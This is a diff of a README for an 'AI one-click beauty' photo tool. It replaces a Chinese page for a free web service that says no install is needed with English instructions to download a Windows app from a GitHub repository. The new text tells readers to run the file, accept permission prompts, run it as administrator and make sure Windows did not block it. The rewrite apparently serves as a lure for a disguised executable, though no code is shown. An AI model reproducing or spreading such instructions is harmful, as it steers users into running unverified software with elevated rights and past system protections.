@@ -1,78 +1,165 @@
-# 🌟 HANYUAI - AI一键美化工具 (免费在线人像精修与美颜)
+# ✨ ai-one-click-beauty - Make Every Image Look Better
 
-![Status](https://img.shields.io/badge/Status-Online-success)
-![Price](https://img.shields.io/badge/Price-Free-blue)
-![Platform](https://img.shields.io/badge/Platform-Web%20Browser-lightgrey)
-![Tech](https://img.shields.io/badge/Technology-AI%20Deep%20Learning-orange)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/epigraphcommissioner131/ai-one-click-beauty)
 
-欢迎了解 **[HANYUAI 图像助理](https://www.hanyuai.com/zh)** 旗下的核心工具：**[AI一键美化](https://www.hanyuai.com/zh/image-edit/ai-one-click-beauty)**。
+## 🌟 What This App Does
 
-这是一个完全免费的在线 AI 图像编辑工具。通过先进的深度学习算法与神经网络渲染技术，只需一键即可实现智能磨皮、美白提亮、瘦脸、五官精修及妆容增强等全方位美颜效果。告别繁琐的 PS 操作，让每位用户都能快速生成影楼级的高清人像大片。
+ai-one-click-beauty is a Windows app for one-click image beautifying. It helps you improve photos with a simple process, so you can get a cleaner and more polished look without learning editing tools.
 
-👉 **立即免费体验：[HANYUAI - AI一键美化](https://www.hanyuai.com/zh/image-edit/ai-one-click-beauty)**
+Use it when you want to:
 
----
+- Enhance portraits with one click
+- Smooth rough image areas
+- Improve brightness and color balance
+- Make photos look more refined
+- Save time on manual editing
 
-## ✨ 核心功能与特色 (Core Features)
+## 💻 What You Need
 
-*   👩‍🦰 **智能磨皮，肌肤如雪**
-    将粗糙肤质智能转化为细腻牛奶肌，精准去除痘印斑点与暗沉色块，保留真实皮肤纹理，打造无瑕美肌。
-*   👁️ **五官精修，立体深邃**
-    再现专业化妆师修容技法，智能补充自然的鼻影高光、雕刻精致脸型轮廓，让平淡五官焕发立体深邃魅力。
-*   💄 **一键上妆，气色提升**
-    让素颜照片瞬间焕发精致妆容的潮流质感。AI 深度匹配日系、欧美等热门妆面与色号，色彩和谐自然。
-*   🎬 **质感滤镜，氛围拉满**
-    将普通场景化作电影画面，采用高级调色与柔焦光影。无论是日常自拍还是旅行记录，一键打造氛围感人像篇章。
-*   ⚡ **极速出图 & 零门槛**
-    无需下载安装，打开网页即用；平均 **15秒** 内完成极速渲染，支持 JPG、PNG、WebP 等高清格式（最大 24MB）。
+This app is made for Windows desktop use.
 
----
+You will need:
 
-## 🛠️ 如何使用 (How It Works)
+- A Windows PC
+- Enough free disk space for the app and your images
+- A stable internet connection for the first download
+- A mouse or touchpad for basic use
 
-只需简单的 4 个步骤，即可完成照片的脱胎换骨：
+For best results, use:
 
-1.  **上传图片：** 拖拽或点击上传需要美化的人像照片。
-2.  **撰写提示词 (Prompt)：** 用自然语言向 AI 描述您的修图愿景。
-    *   *示例 1：* `"去除面部痘印并提亮肤色，保留皮肤纹理"`
-    *   *示例 2：* `"打造自然清透的伪素颜妆感，充满氧气感的少女氛围"`
-    *   *示例 3：* `"转换为电影胶片质感的人像照片，色彩浓郁复古"`
-3.  **选择模型：** 平台内置包括 Nano Banana Pro(最火)、Seedream 4.5、Flux-Kontext、Z-Image-Turbo 等多种顶级 AI 绘画及图像处理模型，满足不同质感需求。
-4.  **免费下载：** 确认满意后，一键下载高清无水印精修美图。
+- Windows 10 or Windows 11
+- A computer with at least 8 GB of RAM
+- A newer CPU for faster image processing
 
----
+## 📥 Download the App
 
-## 🛡️ 数据安全与隐私保护 (Privacy & Security)
+Go to the download page here:
 
-我们深知隐私对于用户的绝对重要性。平台采用企业级数据加密：
-*   所有上传的图片仅用于实时 AI 渲染处理。
-*   处理完成后，系统会**自动清除**原始及生成文件。
-*   严格保护用户隐私与肖像权安全，绝不滥用用户数据。
+https://github.com/epigraphcommissioner131/ai-one-click-beauty
 
----
+On that page, look for the latest release or the main app file. Download it to your computer. If the file comes as a ZIP package, extract it before opening the app.
 
-## ❓ 常见问题 (FAQ)
+## 🪟 Install on Windows
 
-**Q：完成一键美化需耗时多久？**
-A：美化全流程通常在 15 秒内完成，涵盖上传、面部分析、智能修图与高清导出。
+Follow these steps on your Windows PC:
 
-**Q：选择 AI 一键美化的核心价值是什么？**
-A：个人用户可轻松获得专业级写真效果，摄影师能快速完成批量后期修图。相比手动 PS 效率提升数十倍，且自然度媲美人工精修。
+1. Open the download link above in your browser.
+2. Find the latest release or main download file.
+3. Download the file to your Downloads folder.
+4. If the file is compressed, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it to start.
 
-**Q：能否优化低光照人像（废片拯救）？**
-A：可以。工具具备面部智能补光功能，可先提升光感再进行智能美化，即使原图光线不足，也能输出通透亮丽的作品。
+If Windows asks for permission, choose Yes so the app can open.
 
-**Q：AI 修图的精准度如何？**
-A：基于百万级人像数据训练，能精准捕捉五官轮廓与皮肤瑕疵，从发丝细节到妆容色彩均高度贴合，确保美颜效果自然真实。
+## 🧭 First Launch
 
----
+When you open ai-one-click-beauty for the first time:
 
-## 🔗 相关资源与导航 (Links)
+1. Let the app finish loading.
+2. Choose an image from your computer.
+3. Pick the beautify option or default mode.
+4. Start processing the image.
+5. Save the result to a folder you can find again.
 
-探索更多由 HANYUAI 提供的强大 AI 图像工具：
+If the app gives you quality options, start with the default setting. That is the easiest way to get a good result.
 
-*   🏠 **HANYUAI 官网：** [www.hanyuai.com](https://www.hanyuai.com/zh)
-*   🖼️ **所有 AI 图像编辑工具：** [探索更多应用](https://www.hanyuai.com/zh/image-edit)
-*   ✨ **直达体验 - AI 一键美化：** [点击即刻开始](https://www.hanyuai.com/zh/image-edit/ai-one-click-beauty)
+## 🖼️ How to Use It
 
-> **关于我们：** HANYUAI 图像助理致力于提供免费、前沿、高效的 AI 在线图像处理服务，帮助全球创作者、摄影师及普通用户轻松完成各种创意和工作需求。
+A simple way to use the app:
+
+1. Open the app.
+2. Click the button to add a photo.
+3. Select an image from your PC.
+4. Click the one-click beautify action.
+5. Wait for the app to finish.
+6. Save the edited image.
+
+For best results, use clear photos with decent lighting. Faces, portraits, and close-up shots usually work best.
+
+## ⚙️ Common Use Cases
+
+This app can help with:
+
+- Portrait cleanup
+- Skin tone improvement
+- General photo enhancement
+- Social media image prep
+- Quick before-and-after edits
+
+If you want a fast way to improve an image without manual editing, this app fits that job well.
+
+## 📁 File Tips
+
+Keep these tips in mind:
+
+- Use a folder with enough free space
+- Save your output files in a separate folder
+- Keep the original photo unchanged
+- Use common image formats like JPG or PNG
+- Rename files if you want to track versions
+
+A simple folder structure helps you stay organized:
+
+- Originals
+- Edited
+- Shared
+
+## 🛠️ If Something Goes Wrong
+
+If the app does not open:
+
+- Check that the download finished
+- Extract the ZIP file if needed
+- Try running the app again
+- Right-click the app and choose Run as administrator
+- Make sure Windows did not block the file
+
+If the image will not load:
+
+- Try a JPG or PNG file
+- Move the file to a simple folder path
+- Remove special characters from the file name
+- Try another photo
+
+If the output looks wrong:
+
+- Use a clearer image
+- Try a different photo size
+- Start with the default settings
+- Check if the image is too dark or too blurry
+
+## 🔒 Safe Use on Your PC
+
+Keep these habits in place:
+
+- Download only from the link above
+- Avoid changing app files unless you know what they do
+- Keep your photos backed up
+- Close other heavy apps if your computer feels slow
+
+## 📌 Quick Start
+
+1. Open the download link
+2. Download the app
+3. Extract the files if needed
+4. Open the app
+5. Add a photo
+6. Click the beautify action
+7. Save the result
+
+## 🧩 What to Expect
+
+This app aims to keep the process simple. You choose a photo, run the beautify step, and save the result. You do not need editing skill to get started, and you do not need to set up a complex workflow
+
+## 📷 Best Photo Tips
+
+For better results:
+
+- Use photos with good light
+- Keep the face clear and centered
+- Avoid very small images
+- Use sharp pictures instead of blurry ones
+- Try one photo at a time first
+
+If you test with a few images, you can learn which type gives the best output for your needs
